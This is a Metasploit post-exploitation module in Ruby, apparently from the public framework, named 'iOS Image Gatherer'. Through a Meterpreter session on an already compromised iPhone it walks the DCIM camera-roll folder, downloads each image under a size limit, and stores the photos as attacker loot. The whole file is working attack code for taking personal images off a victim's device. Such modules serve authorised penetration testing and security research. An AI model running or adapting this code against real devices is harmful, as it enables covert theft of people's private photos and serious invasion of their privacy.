##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'iOS Image Gatherer',
        'Description' => %q{
          This module collects images from iPhones.
          Module was tested on iOS 10.3.3 on an iPhone 5.
        },
        'License' => MSF_LICENSE,
        'Author' => [ 'Shelby Pace' ], # Metasploit Module
        'Platform' => [ 'apple_ios' ],
        'SessionTypes' => [ 'meterpreter' ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [],
          'Reliability' => []
        },
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              core_channel_close
              core_channel_eof
              core_channel_open
              core_channel_read
              stdapi_fs_stat
            ]
          }
        }
      )
    )

    register_advanced_options([
      OptInt.new('MAX_FILE_SIZE', [true, 'Maximum image file size to download in megabytes', 10])
    ])
  end

  def enum_img(f_path)
    ios_imgs = dir(f_path)

    ios_imgs.each do |img|
      next if ['.', '..'].include?(img)

      img_full_path = "#{f_path}/#{img}"
      file_size = stat(img_full_path).size
      max_size = datastore['MAX_FILE_SIZE'] * 1024 * 1024
      if file_size > max_size
        print_warning("Skipping #{img}: file size #{file_size} bytes exceeds MAX_FILE_SIZE (#{datastore['MAX_FILE_SIZE']} MB)")
        next
      end

      print_status("Downloading image: #{img}")
      image_data = read_file(img_full_path)
      if image_data.nil?
        print_error("#{img} could not be read: read_file returned nil")
        next
      end

      loot_path = store_loot('ios.image', 'application/octet-stream', session, image_data, img, "iOS image #{img}")
      print_good("Image stored at: #{loot_path}")
    rescue StandardError => e
      print_error("#{img} could not be downloaded: #{e.message}")
    end
  end

  def run
    img_path = '/private/var/mobile/Media/DCIM/100APPLE'
    unless directory?(img_path)
      fail_with(Failure::NotFound, 'Could not find the default image file path')
    end
    print_good('Image path found. Will begin searching for images...')

    enum_img(img_path)
  end
end
